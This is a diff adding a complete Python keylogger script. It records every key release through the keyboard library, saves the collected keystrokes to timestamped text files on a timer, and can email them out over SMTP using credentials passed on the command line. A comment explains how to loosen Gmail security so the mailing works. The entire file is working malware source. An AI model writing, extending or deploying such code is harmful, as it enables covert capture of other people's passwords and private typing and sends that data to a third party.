@@ -1,0 +1,60 @@
+import keyboard as keyboard
+import sys
+from threading import Timer
+from time import time
+import smtplib
+log = ""
+print(sys.argv)
+duration = int(sys.argv[1])
+folder_name = sys.argv[2]
+use_mail = (sys.argv[3]!="false")
+email ,passwd ,host , port = "","","",""
+if use_mail :
+	email = sys.argv[4]
+	passwd = sys.argv[5]
+	host = sys.argv[6]
+	port = sys.argv[7]
+
+def recorder(event):
+	global log
+	if event.name =="space" or event.name =="right shift" or event.name =="left shift" or event.name =="left alt" or event.name=="right alt" or event.name=="alt" or event.name=="ctrl" or event.name=="left ctrl" or event.name=="right ctrl" :
+		log+=" "
+	else:
+		log += event.name
+
+def report_to_file(path="",message=""):
+	file_name = path+"//"+(str(time()).split('.'))[0] +".txt"
+	with open(file_name,'w') as f:
+		f.write(message)
+def send_to_mail(email,passwd,host,port):
+	global log
+	connection = smtplib.SMTP(host=host,port=int(port))
+	connection.starttls()
+	#make sure ur email acceptt less secured apps so it allows this app to use ur gmail
+	#https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4O21GOGxU34sNQJYrSN3D6q2xnk22uzHt-Y4PWxvc00Z-1JYDtzvDu3PyrqN0ieku_vEUo3KImtbIXbxcCiPRaQAiIzqQ
+	connection.login(email,passwd)
+	connection.sendmail(email,email,log)
+	connection.quit()
+def report_now(path,umail=False,email="",passwd="",host="",port="0"):
+	global log
+	print("didnt but sad")
+	if log!="":
+		print("logged but sad")
+		report_to_file(path,log)
+	if(umail):
+		send_to_mail(email,passwd,host,port)
+	log=""
+
+def pack():
+	global duration,folder_name,email,passwd,host,port,use_mail
+	print("p_start")
+	report_now(folder_name,use_mail,email,passwd,host,port)
+	timer = Timer(duration,function=pack)
+	timer.daemon = True
+	timer.start()
+
+#pack(duration,folder_name,use_mail,email,passwd,host,port)
+pack()
+
+data = keyboard.on_release(callback=recorder)
+keyboard.wait("ctrl+shift+r")
